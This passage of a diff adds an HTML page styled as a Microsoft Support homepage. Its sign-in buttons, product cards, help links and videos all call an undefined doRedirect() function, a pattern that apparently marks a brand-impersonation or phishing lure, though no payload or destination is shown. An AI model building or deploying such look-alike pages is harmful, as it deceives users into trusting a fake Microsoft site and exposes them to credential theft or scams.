@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Microsoft Support</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', Arial, sans-serif; color: #1a1a1a; background: #fff; font-size: 14px; }
+    a { text-decoration: none; color: inherit; }
+    a:hover { text-decoration: underline; }
+
+    /* ── HEADER ── */
+    header {
+      position: sticky; top: 0; z-index: 100;
+      background: #fff; border-bottom: 1px solid #e0e0e0;
+    }
+    .top-bar {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 24px; height: 48px; max-width: 1600px; margin: 0 auto;
+    }
+    .logo { display: flex; align-items: center; gap: 10px; font-size: 15px; font-weight: 600; color: #1a1a1a; }
+    .logo-ms { width: 24px; height: 24px; flex-shrink: 0; }
+    .logo-divider { width: 1px; height: 18px; background: #ccc; }
+    .logo-text { color: #666; font-weight: 400; }
+
+    .header-right { display: flex; align-items: center; gap: 16px; }
+    .search-bar {
+      display: flex; align-items: center; border: 1px solid #ccc;
+      border-radius: 2px; overflow: hidden; height: 32px;
+    }
+    .search-bar input {
+      border: none; outline: none; padding: 0 10px; width: 260px;
+      font-size: 13px; font-family: inherit;
+    }
+    .search-bar button {
+      background: #0067b8; border: none; color: #fff; padding: 0 12px;
+      height: 32px; cursor: pointer; display: flex; align-items: center; justify-content: center;
+    }
+    .search-bar button:hover { background: #005a9e; }
+    .search-bar button svg { width: 15px; height: 15px; }
+    .sign-in-btn {
+      display: flex; align-items: center; gap: 6px;
+      padding: 6px 12px; border: 1px solid #0067b8; color: #0067b8;
+      border-radius: 2px; font-size: 13px; cursor: pointer; white-space: nowrap;
+    }
+    .sign-in-btn:hover { background: #f0f6ff; }
+    .sign-in-btn svg { width: 15px; height: 15px; flex-shrink: 0; }
+
+    /* ── NAV ── */
+    nav { border-top: 1px solid #e0e0e0; background: #fff; }
+    .nav-inner {
+      display: flex; max-width: 1600px; margin: 0 auto; padding: 0 24px;
+    }
+    .nav-item {
+      display: flex; align-items: center; gap: 4px;
+      padding: 10px 14px; font-size: 13px; cursor: pointer; white-space: nowrap; color: #1a1a1a;
+    }
+    .nav-item:hover { color: #0067b8; }
+    .nav-item.active { border-bottom: 2px solid #0067b8; color: #0067b8; font-weight: 600; }
+    .chevron { width: 10px; height: 10px; }
+
+    /* ── MAIN ── */
+    main { max-width: 1200px; margin: 0 auto; padding: 0 24px 40px; }
+
+    /* Hero */
+    .hero {
+      background: linear-gradient(135deg, #f3f9ff 0%, #e8f4ff 100%);
+      border-radius: 8px; padding: 40px 48px; margin: 32px 0 32px;
+      display: flex; align-items: center; justify-content: space-between; gap: 32px;
+    }
+    .hero h1 { font-size: 28px; font-weight: 600; color: #1a1a1a; margin-bottom: 10px; }
+    .hero p { color: #555; font-size: 15px; line-height: 1.5; max-width: 500px; }
+    .hero-cta {
+      margin-top: 18px; display: inline-flex; align-items: center; gap: 8px;
+      background: #0067b8; color: #fff; padding: 10px 20px;
+      border-radius: 2px; font-size: 14px; cursor: pointer;
+    }
+    .hero-cta:hover { background: #005a9e; text-decoration: none; }
+    .hero-cta svg { width: 14px; height: 14px; }
+    .hero-img { flex-shrink: 0; }
+
+    /* Section titles */
+    .section-title { font-size: 18px; font-weight: 600; margin-bottom: 16px; color: #1a1a1a; }
+
+    /* Product grid */
+    .product-grid {
+      display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; margin-bottom: 40px;
+    }
+    .product-card {
+      display: flex; flex-direction: column; align-items: center; gap: 10px;
+      padding: 20px 10px; border: 1px solid #e0e0e0; border-radius: 6px;
+      cursor: pointer; transition: box-shadow .15s, border-color .15s; text-align: center;
+    }
+    .product-card:hover { box-shadow: 0 4px 12px rgba(0,0,0,.1); border-color: #0067b8; text-decoration: none; }
+    .product-icon { width: 48px; height: 48px; }
+    .product-icon svg { width: 48px; height: 48px; }
+    .product-name { font-size: 13px; font-weight: 600; color: #1a1a1a; }
+    .more-products { background: #f9f9f9; }
+
+    /* Trending */
+    .trending-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; margin-bottom: 40px; }
+    .trending-card { border: 1px solid #e0e0e0; border-radius: 6px; padding: 20px; }
+    .trending-card h3 { font-size: 15px; font-weight: 600; margin-bottom: 12px; color: #1a1a1a; }
+    .trending-card ul { list-style: none; display: flex; flex-direction: column; gap: 8px; }
+    .trending-card li a { color: #0067b8; font-size: 13px; line-height: 1.4; }
+    .trending-card li a:hover { text-decoration: underline; }
+
+    /* Banner */
+    .banner {
+      background: linear-gradient(90deg, #0078d4, #005a9e);
+      color: #fff; border-radius: 8px; padding: 28px 36px;
+      display: flex; align-items: center; justify-content: space-between;
+      margin-bottom: 40px; gap: 20px;
+    }
+    .banner h2 { font-size: 20px; font-weight: 600; margin-bottom: 6px; }
+    .banner p { font-size: 14px; opacity: .9; max-width: 560px; line-height: 1.5; }
+    .banner-btn {
+      background: #fff; color: #0067b8; padding: 10px 20px; border-radius: 2px;
+      font-size: 14px; font-weight: 600; white-space: nowrap; cursor: pointer; flex-shrink: 0;
+    }
+    .banner-btn:hover { background: #f0f0f0; text-decoration: none; }
+
+    /* Two-col */
+    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 40px; }
+    .info-card { border: 1px solid #e0e0e0; border-radius: 6px; padding: 24px; }
+    .info-card h3 { font-size: 16px; font-weight: 600; margin-bottom: 10px; }
+    .info-card p { font-size: 13px; color: #555; line-height: 1.6; margin-bottom: 14px; }
+    .info-card a { color: #0067b8; font-size: 13px; font-weight: 600; }
+
+    /* Videos */
+    .video-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 40px; }
+    .video-card { border-radius: 6px; overflow: hidden; border: 1px solid #e0e0e0; cursor: pointer; }
+    .video-card:hover .play-btn { background: rgba(255,255,255,.35); }
+    .video-thumb {
+      height: 148px; display: flex; align-items: center;
+      justify-content: center; position: relative; overflow: hidden;
+    }
+    .video-thumb-1 { background: linear-gradient(135deg, #0078d4 0%, #00b4d8 100%); }
+    .video-thumb-2 { background: linear-gradient(135deg, #4b53bc 0%, #7b2ff7 100%); }
+    .video-thumb-3 { background: linear-gradient(135deg, #107c10 0%, #2dc653 100%); }
+    .video-thumb svg.scene { position: absolute; width: 100%; height: 100%; opacity: .18; }
+    .play-btn {
+      position: relative; width: 50px; height: 50px;
+      background: rgba(255,255,255,.22); border: 2px solid rgba(255,255,255,.85);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      transition: background .15s; -webkit-backdrop-filter: blur(2px); backdrop-filter: blur(2px);
+    }
+    .play-btn svg { width: 20px; height: 20px; margin-left: 3px; }
+    .video-info { padding: 12px 14px; }
+    .video-info h4 { font-size: 13px; font-weight: 600; margin-bottom: 4px; color: #1a1a1a; }
+    .video-info span { font-size: 12px; color: #666; }
+
+    /* Support options */
+    .support-options { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-bottom: 40px; }
+    .support-opt {
+      display: flex; flex-direction: column; align-items: flex-start; gap: 8px;
+      padding: 20px; border: 1px solid #e0e0e0; border-radius: 6px;
+      cursor: pointer; transition: box-shadow .15s;
+    }
+    .support-opt:hover { box-shadow: 0 4px 12px rgba(0,0,0,.1); }
+    .support-opt .icon { width: 36px; height: 36px; }
+    .support-opt .icon svg { width: 36px; height: 36px; }
+    .support-opt h4 { font-size: 14px; font-weight: 600; }
+    .support-opt p { font-size: 12px; color: #555; line-height: 1.4; }
+    .support-opt a { color: #0067b8; font-size: 13px; font-weight: 600; margin-top: auto; }
+
+    /* ── FOOTER ── */
+    footer { background: #f2f2f2; border-top: 1px solid #d0d0d0; margin-top: 40px; }
+    .footer-grid {
+      display: grid; grid-template-columns: repeat(5, 1fr); gap: 32px;
+      max-width: 1200px; margin: 0 auto; padding: 40px 24px 32px;
+    }
+    .footer-col h4 { font-size: 13px; font-weight: 600; color: #1a1a1a; margin-bottom: 12px; }
+    .footer-col ul { list-style: none; display: flex; flex-direction: column; gap: 8px; }
+    .footer-col li a { font-size: 12px; color: #444; }
+    .footer-col li a:hover { color: #0067b8; text-decoration: underline; }
+    .footer-bottom {
+      border-top: 1px solid #d0d0d0; padding: 16px 24px;
+      display: flex; align-items: center; justify-content: space-between;
+      max-width: 1200px; margin: 0 auto; flex-wrap: wrap; gap: 10px;
+    }
+    .footer-bottom-links { display: flex; gap: 16px; flex-wrap: wrap; }
+    .footer-bottom-links a { font-size: 12px; color: #444; }
+    .footer-bottom-links a:hover { color: #0067b8; text-decoration: underline; }
+    .footer-locale { font-size: 12px; color: #444; }
+
+    /* Responsive */
+    @media (max-width: 900px) {
+      .product-grid { grid-template-columns: repeat(3, 1fr); }
+      .trending-grid { grid-template-columns: 1fr; }
+      .two-col { grid-template-columns: 1fr; }
+      .support-options { grid-template-columns: repeat(2, 1fr); }
+      .footer-grid { grid-template-columns: repeat(2, 1fr); }
+      .video-grid { grid-template-columns: 1fr 1fr; }
+    }
+    @media (max-width: 600px) {
+      .product-grid { grid-template-columns: repeat(2, 1fr); }
+      .hero { flex-direction: column; padding: 24px; }
+      .hero-img { display: none; }
+      .search-bar input { width: 150px; }
+      .support-options { grid-template-columns: 1fr; }
+      .footer-grid { grid-template-columns: 1fr; }
+      .banner { flex-direction: column; }
+      .video-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ══════════════════════════════ HEADER ══════════════════════════════ -->
+<header>
+  <div class="top-bar">
+
+    <!-- Microsoft Logo + Support wordmark -->
+    <div class="logo">
+      <svg class="logo-ms" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Microsoft">
+        <rect x="0" y="0" width="11" height="11" fill="#f25022"/>
+        <rect x="13" y="0" width="11" height="11" fill="#7fba00"/>
+        <rect x="0" y="13" width="11" height="11" fill="#00a4ef"/>
+        <rect x="13" y="13" width="11" height="11" fill="#ffb900"/>
+      </svg>
+      <span>Microsoft</span>
+      <div class="logo-divider"></div>
+      <span class="logo-text">Support</span>
+    </div>
+
+    <!-- Search bar + Sign in -->
+    <div class="header-right">
+      <div class="search-bar">
+        <input type="text" placeholder="Search support" aria-label="Search support" />
+        <button aria-label="Search">
+          <svg viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="8.5" cy="8.5" r="5.5" stroke="white" stroke-width="2"/>
+            <line x1="12.8" y1="12.8" x2="18" y2="18" stroke="white" stroke-width="2.2" stroke-linecap="round"/>
+          </svg>
+        </button>
+      </div>
+      <div class="sign-in-btn" role="button" tabindex="0" onclick="doRedirect()">
+        <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="8" cy="5.5" r="3" stroke="#0067b8" stroke-width="1.5"/>
+          <path d="M2 15 Q2 10 8 10 Q14 10 14 15" stroke="#0067b8" stroke-width="1.5" stroke-linecap="round"/>
+        </svg>
+        Sign in
+      </div>
+    </div>
+  </div>
+
+  <!-- Primary navigation -->
+  <nav aria-label="Main navigation">
+    <div class="nav-inner">
+      <div class="nav-item active">Support</div>
+      <div class="nav-item">
+        Products
+        <svg class="chevron" viewBox="0 0 10 7" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <polyline points="1,1 5,6 9,1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <div class="nav-item">
+        Devices
+        <svg class="chevron" viewBox="0 0 10 7" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <polyline points="1,1 5,6 9,1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <div class="nav-item">Account &amp; Billing</div>
+      <div class="nav-item">
+        Resources
+        <svg class="chevron" viewBox="0 0 10 7" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <polyline points="1,1 5,6 9,1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+    </div>
+  </nav>
+</header>
+
+<!-- ══════════════════════════════ MAIN ══════════════════════════════ -->
+<main>
+
+  <!-- ── Hero ── -->
+  <section class="hero" aria-label="Welcome">
+    <div>
+      <h1>Welcome to Microsoft Support</h1>
+      <p>Find solutions, contact support, and stay informed with the latest Microsoft product updates.</p>
+      <a href="#" class="hero-cta" onclick="doRedirect(); return false;">
+        Sign in to get personalized help
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <polyline points="4,2 10,7 4,12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </a>
+    </div>
+    <!-- Support shield illustration -->
+    <div class="hero-img" aria-hidden="true">
+      <svg width="190" height="168" viewBox="0 0 190 168" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <linearGradient id="shieldFill" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0%" stop-color="#0078d4" stop-opacity="0.12"/>
+            <stop offset="100%" stop-color="#0078d4" stop-opacity="0.04"/>
+          </linearGradient>
+        </defs>
+        <!-- Outer shield -->
+        <path d="M95 10 L166 36 L166 94 Q166 148 95 164 Q24 148 24 94 L24 36 Z"
+              fill="url(#shieldFill)" stroke="#0078d4" stroke-width="2" stroke-opacity="0.25" stroke-linejoin="round"/>
+        <!-- Inner shield ring -->
+        <path d="M95 28 L150 49 L150 94 Q150 134 95 150 Q40 134 40 94 L40 49 Z"
+              fill="none" stroke="#0078d4" stroke-width="1.5" stroke-opacity="0.15" stroke-linejoin="round"/>
+        <!-- Checkmark -->
+        <polyline points="66,92 86,114 126,68"
+                  fill="none" stroke="#0078d4" stroke-width="8"
+                  stroke-linecap="round" stroke-linejoin="round" stroke-opacity="0.8"/>
+        <!-- Small decorative dots -->
+        <circle cx="162" cy="28" r="4" fill="#0078d4" fill-opacity="0.2"/>
+        <circle cx="172" cy="44" r="2.5" fill="#0078d4" fill-opacity="0.15"/>
+        <circle cx="28" cy="130" r="3" fill="#0078d4" fill-opacity="0.15"/>
+      </svg>
+    </div>
+  </section>
+
+  <!-- ── Product Grid ── -->
+  <section aria-label="Products">
+    <h2 class="section-title">Browse by product</h2>
+    <div class="product-grid">
+
+      <!-- Microsoft 365 -->
+      <a href="#" class="product-card" onclick="doRedirect(); return false;">
+        <span class="product-icon">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <rect width="48" height="48" rx="8" fill="#d83b01"/>
+            <path d="M9 13 L16 13 L24 28 L32 13 L39 13 L39 35 L33 35 L33 22 L26.5 34 L21.5 34 L15 22 L15 35 L9 35 Z" fill="white"/>
+          </svg>
+        </span>
+        <span class="product-name">Microsoft 365</span>
+      </a>
+
+      <!-- Outlook -->
+      <a href="#" class="product-card" onclick="doRedirect(); return false;">
+        <span class="product-icon">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <rect width="48" height="48" rx="8" fill="#0078d4"/>
+            <rect x="7" y="14" width="34" height="22" rx="2" fill="#004c8c"/>
+            <polyline points="7,14 24,27 41,14" fill="none" stroke="white" stroke-width="2" stroke-linejoin="round"/>
+            <circle cx="18" cy="29" r="7.5" fill="#0078d4"/>
+            <circle cx="18" cy="29" r="5" fill="none" stroke="white" stroke-width="2.5"/>
+          </svg>
+        </span>
+        <span class="product-name">Outlook</span>
+      </a>
+
+      <!-- OneDrive -->
+      <a href="#" class="product-card" onclick="doRedirect(); return false;">
+        <span class="product-icon">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <rect width="48" height="48" rx="8" fill="#0078d4"/>
+            <path d="M11 35 Q6 35 6 30 Q6 25 11 24 Q12 17 19 17 Q24 17 26 21 Q28 20 31 21 Q38 21 38 28 Q42 28 42 32 Q42 35 38 35 Z" fill="white"/>
+          </svg>
+        </span>
+        <span class="product-name">OneDrive</span>
+      </a>
+
+      <!-- Windows -->
+      <a href="#" class="product-card" onclick="doRedirect(); return false;">
+        <span class="product-icon">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <polygon points="5,11  21,8.5 21,24 5,24"  fill="#0078d4"/>
+            <polygon points="23,8  43,5  43,24 23,24" fill="#0078d4"/>
+            <polygon points="5,26  21,26 21,40 5,37.5" fill="#0078d4"/>
+            <polygon points="23,26 43,26 43,43 23,40" fill="#0078d4"/>
+          </svg>
+        </span>
+        <span class="product-name">Windows</span>
+      </a>
+
+      <!-- Microsoft Copilot -->
+      <a href="#" class="product-card" onclick="doRedirect(); return false;">
+        <span class="product-icon">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <linearGradient id="cpGrad" x1="0.2" y1="0" x2="0.8" y2="1">
+                <stop offset="0%"   stop-color="#00c8ff"/>
+                <stop offset="50%"  stop-color="#8a2be2"/>
+                <stop offset="100%" stop-color="#00c8ff"/>
+              </linearGradient>
+            </defs>
+            <rect width="48" height="48" rx="8" fill="#1b1b2e"/>
+            <path d="M24 6 L26.8 20 L40 24 L26.8 28 L24 42 L21.2 28 L8 24 L21.2 20 Z" fill="url(#cpGrad)"/>
+            <path d="M38 10 L39.2 14.5 L43.5 15.5 L39.2 16.5 L38 21 L36.8 16.5 L32.5 15.5 L36.8 14.5 Z" fill="#00c8ff" opacity="0.65"/>
+          </svg>
+        </span>
+        <span class="product-name">Microsoft Copilot</span>
+      </a>
+
+      <!-- Surface -->
+      <a href="#" class="product-card" onclick="doRedirect(); return false;">
+        <span class="product-icon">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <rect width="48" height="48" rx="8" fill="#1f3050"/>
+            <rect x="8"  y="10" width="32" height="21" rx="2" fill="#0f1e35" stroke="#3a5a8c" stroke-width="1.2"/>
+            <rect x="10" y="12" width="28" height="17" rx="1" fill="#162840"/>
+            <rect x="17.5" y="16" width="5"   height="5"   rx="0.8" fill="white" opacity="0.55"/>
+            <rect x="24"   y="16" width="5"   height="5"   rx="0.8" fill="white" opacity="0.55"/>
+            <rect x="17.5" y="22" width="5"   height="4"   rx="0.8" fill="white" opacity="0.55"/>
+            <rect x="24"   y="22" width="5"   height="4"   rx="0.8" fill="white" opacity="0.55"/>
+            <rect x="6" y="32" width="36" height="5" rx="2.5" fill="#3a5a8c"/>
+            <line x1="8" y1="32" x2="40" y2="32" stroke="#1f3050" stroke-width="0.8"/>
+          </svg>
+        </span>
+        <span class="product-name">Surface</span>
+      </a>
+
+      <!-- Xbox & Gaming -->
+      <a href="#" class="product-card" onclick="doRedirect(); return false;">
+        <span class="product-icon">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="24" cy="24" r="22" fill="#107c10"/>
+            <circle cx="24" cy="24" r="22" fill="none" stroke="#0e6b0e" stroke-width="1"/>
+            <ellipse cx="24" cy="24" rx="22" ry="12" fill="none" stroke="#0e6b0e" stroke-width="0.8"/>
+            <line x1="2" y1="24" x2="46" y2="24" stroke="#0e6b0e" stroke-width="0.8"/>
+            <line x1="13" y1="13" x2="35" y2="35" stroke="white" stroke-width="5" stroke-linecap="round"/>
+            <line x1="35" y1="13" x2="13" y2="35" stroke="white" stroke-width="5" stroke-linecap="round"/>
+          </svg>
+        </span>
+        <span class="product-name">Xbox &amp; Gaming</span>
+      </a>
+
+      <!-- Microsoft Teams -->
+      <a href="#" class="product-card" onclick="doRedirect(); return false;">
+        <span class="product-icon">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <rect width="48" height="48" rx="8" fill="#4b53bc"/>
+            <rect x="11" y="13" width="20" height="4" rx="2" fill="white"/>
+            <rect x="19" y="13" width="4" height="22" rx="2" fill="white"/>
+            <circle cx="36" cy="18" r="4.5" fill="white" opacity="0.65"/>
+            <path d="M29 36 Q29 27 36 27 Q43 27 43 36" fill="white" opacity="0.65"/>
+          </svg>
+        </span>
+        <span class="product-name">Microsoft Teams</span>
+      </a>
+
+      <!-- Microsoft Store -->
+      <a href="#" class="product-card" onclick="doRedirect(); return false;">
+        <span class="product-icon">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <rect width="48" height="48" rx="8" fill="#f2f2f2"/>
+            <path d="M13 20 L11 40 L37 40 L35 20 Z" fill="none" stroke="#333" stroke-width="2" stroke-linejoin="round"/>
+            <path d="M18 20 Q18 10 24 10 Q30 10 30 20" fill="none" stroke="#333" stroke-width="2" stroke-linecap="round"/>
+            <rect x="18" y="26" width="5" height="5" rx="0.5" fill="#f25022"/>
+            <rect x="25" y="26" width="5" height="5" rx="0.5" fill="#7fba00"/>
+            <rect x="18" y="33" width="5" height="4" rx="0.5" fill="#00a4ef"/>
+            <rect x="25" y="33" width="5" height="4" rx="0.5" fill="#ffb900"/>
+          </svg>
+        </span>
+        <span class="product-name">Microsoft Store</span>
+      </a>
+
+      <!-- More products -->
+      <a href="#" class="product-card more-products" onclick="doRedirect(); return false;">
+        <span class="product-icon">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="14" cy="14" r="4" fill="#0078d4" opacity="0.7"/>
+            <circle cx="24" cy="14" r="4" fill="#0078d4" opacity="0.7"/>
+            <circle cx="34" cy="14" r="4" fill="#0078d4" opacity="0.7"/>
+            <circle cx="14" cy="24" r="4" fill="#0078d4" opacity="0.7"/>
+            <circle cx="24" cy="24" r="4" fill="#0078d4" opacity="0.7"/>
+            <circle cx="34" cy="24" r="4" fill="#0078d4" opacity="0.7"/>
+            <circle cx="14" cy="34" r="4" fill="#0078d4" opacity="0.7"/>
+            <circle cx="24" cy="34" r="4" fill="#0078d4" opacity="0.7"/>
+            <circle cx="34" cy="34" r="4" fill="#0078d4" opacity="0.7"/>
+          </svg>
+        </span>
+        <span class="product-name">More products</span>
+      </a>
+
+    </div>
+  </section>
+
+  <!-- ── Trending Topics ── -->
+  <section aria-label="Trending topics">
+    <h2 class="section-title">Trending topics</h2>
+    <div class="trending-grid">
+      <div class="trending-card">
+        <h3>Microsoft 365</h3>
+        <ul>
+          <li><a href="#" onclick="doRedirect(); return false;">Download and install Microsoft 365</a></li>
+          <li><a href="#" onclick="doRedirect(); return false;">Sign in to Microsoft 365</a></li>
+          <li><a href="#" onclick="doRedirect(); return false;">Cancel a Microsoft 365 subscription</a></li>
+          <li><a href="#" onclick="doRedirect(); return false;">Change your Microsoft 365 billing</a></li>
+        </ul>
+      </div>
+      <div class="trending-card">
+        <h3>Account &amp; storage</h3>
+        <ul>
+          <li><a href="#" onclick="doRedirect(); return false;">Can't sign in to your Microsoft account</a></li>
+          <li><a href="#" onclick="doRedirect(); return false;">Change your Microsoft account password</a></li>
+          <li><a href="#" onclick="doRedirect(); return false;">Get more cloud storage</a></li>
+          <li><a href="#" onclick="doRedirect(); return false;">Manage your Microsoft account</a></li>
+        </ul>
+      </div>
+      <div class="trending-card">
+        <h3>Activation</h3>
+        <ul>
+          <li><a href="#" onclick="doRedirect(); return false;">Activate Office</a></li>
+          <li><a href="#" onclick="doRedirect(); return false;">Activate Windows</a></li>
+          <li><a href="#" onclick="doRedirect(); return false;">Find your product key</a></li>
+          <li><a href="#" onclick="doRedirect(); return false;">Fix activation errors</a></li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Copilot Banner ── -->
+  <div class="banner" aria-label="Microsoft 365 Copilot">
+    <div>
+      <h2>Meet the AI-first productivity app</h2>
+      <p>Microsoft 365 Copilot combines the power of AI with your Word, Excel, PowerPoint, Outlook, and Teams apps to help you accomplish more every day.</p>
+    </div>
+    <a href="#" class="banner-btn" onclick="doRedirect(); return false;">Explore Microsoft 365 Copilot</a>
+  </div>
+
+  <!-- ── Two-column info ── -->
+  <div class="two-col">
+    <div class="info-card">
+      <h3>Small business help &amp; learning</h3>
+      <p>Resources to help small businesses set up, use, and get the most out of Microsoft products and services — including step-by-step guides and video tutorials.</p>
+      <a href="#" onclick="doRedirect(); return false;">Visit Small business help and learning →</a>
+    </div>
+    <div class="info-card">
+      <h3>Windows &amp; Devices</h3>
+      <p>Get help with Windows 11 setup, system requirements, device support, drivers, and more for your PC, laptop, or Surface device.</p>
+      <a href="#" onclick="doRedirect(); return false;">Explore Windows support →</a>
+    </div>
+  </div>
+
+  <!-- ── Videos ── -->
+  <section aria-label="Video resources">
+    <h2 class="section-title">Small business success stories</h2>
+    <div class="video-grid">
+
+      <!-- Video 1 -->
+      <div class="video-card" onclick="doRedirect()">
+        <div class="video-thumb video-thumb-1">
+          <svg class="scene" viewBox="0 0 320 148" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid slice">
+            <circle cx="260" cy="20"  r="60" fill="white"/>
+            <circle cx="60"  cy="130" r="45" fill="white"/>
+            <rect x="130" y="60" width="80" height="80" rx="8" fill="white" transform="rotate(20 170 100)"/>
+          </svg>
+          <div class="play-btn">
+            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+              <polygon points="4,2 18,10 4,18" fill="white"/>
+            </svg>
+          </div>
+        </div>
+        <div class="video-info">
+          <h4>How Microsoft Teams helps small teams stay connected</h4>
+          <span>1:35</span>
+        </div>
+      </div>
+
+      <!-- Video 2 -->
+      <div class="video-card" onclick="doRedirect()">
+        <div class="video-thumb video-thumb-2">
+          <svg class="scene" viewBox="0 0 320 148" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid slice">
+            <circle cx="300" cy="148" r="80" fill="white"/>
+            <circle cx="20"  cy="20"  r="50" fill="white"/>
+            <circle cx="180" cy="74"  r="30" fill="white"/>
+          </svg>
+          <div class="play-btn">
+            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+              <polygon points="4,2 18,10 4,18" fill="white"/>
+            </svg>
+          </div>
+        </div>
+        <div class="video-info">
+          <h4>Using Microsoft 365 for everyday business tasks</h4>
+          <span>2:10</span>
+        </div>
+      </div>
+
+      <!-- Video 3 -->
+      <div class="video-card" onclick="doRedirect()">
+        <div class="video-thumb video-thumb-3">
+          <svg class="scene" viewBox="0 0 320 148" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid slice">
+            <rect x="220" y="-20" width="140" height="140" rx="20" fill="white" transform="rotate(15 290 50)"/>
+            <rect x="-20"  y="60"  width="120" height="120" rx="20" fill="white" transform="rotate(-10 40 120)"/>
+          </svg>
+          <div class="play-btn">
+            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+              <polygon points="4,2 18,10 4,18" fill="white"/>
+            </svg>
+          </div>
+        </div>
+        <div class="video-info">
+          <h4>Grow your business with Microsoft tools and resources</h4>
+          <span>2:22</span>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ── Support Options ── -->
+  <section aria-label="Support options">
+    <h2 class="section-title">Get support</h2>
+    <div class="support-options">
+
+      <!-- Contact Support -->
+      <div class="support-opt" onclick="doRedirect()">
+        <span class="icon">
+          <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4 L32 4 Q34 4 34 6 L34 24 Q34 26 32 26 L21 26 L14 33 L14 26 L6 26 Q4 26 4 24 L4 6 Q4 4 6 4 Z"
+                  stroke="#0078d4" stroke-width="2" stroke-linejoin="round"/>
+            <circle cx="12" cy="15" r="2.2" fill="#0078d4"/>
+            <circle cx="18" cy="15" r="2.2" fill="#0078d4"/>
+            <circle cx="24" cy="15" r="2.2" fill="#0078d4"/>
+          </svg>
+        </span>
+        <h4>Contact Support</h4>
+        <p>Get help from a Microsoft support agent via chat or phone.</p>
+        <a href="#" onclick="doRedirect(); return false;">Contact us →</a>
+      </div>
+
+      <!-- Enterprise Support -->
+      <div class="support-opt" onclick="doRedirect()">
+        <span class="icon">
+          <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3"  y="7"  width="21" height="26" rx="1" stroke="#0078d4" stroke-width="2"/>
+            <rect x="24" y="15" width="10" height="18" rx="1" stroke="#0078d4" stroke-width="2"/>
+            <rect x="7"  y="13" width="5" height="5" rx="0.5" fill="#0078d4" opacity="0.4"/>
+            <rect x="15" y="13" width="5" height="5" rx="0.5" fill="#0078d4" opacity="0.4"/>
+            <rect x="7"  y="21" width="5" height="5" rx="0.5" fill="#0078d4" opacity="0.4"/>
+            <rect x="15" y="21" width="5" height="5" rx="0.5" fill="#0078d4" opacity="0.4"/>
+            <rect x="11" y="28" width="5" height="5" rx="0.5" fill="#0078d4"/>
+            <line x1="2" y1="33" x2="34" y2="33" stroke="#0078d4" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+        </span>
+        <h4>Enterprise support</h4>
+        <p>Dedicated resources for large organizations and IT admins.</p>
+        <a href="#" onclick="doRedirect(); return false;">Enterprise help →</a>
+      </div>
+
+      <!-- Community Forums -->
+      <div class="support-opt" onclick="doRedirect()">
+        <span class="icon">
+          <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="13" cy="12" r="5" stroke="#0078d4" stroke-width="2"/>
+            <path d="M3 34 Q3 22 13 22 Q23 22 23 34" stroke="#0078d4" stroke-width="2" stroke-linecap="round"/>
+            <circle cx="26" cy="11" r="4" stroke="#0078d4" stroke-width="1.5" stroke-opacity="0.5"/>
+            <path d="M21 34 Q22 25 28 25 Q34 25 34 34" stroke="#0078d4" stroke-width="1.5" stroke-linecap="round" stroke-opacity="0.5"/>
+          </svg>
+        </span>
+        <h4>Community forums</h4>
+        <p>Ask questions and find answers from the Microsoft community.</p>
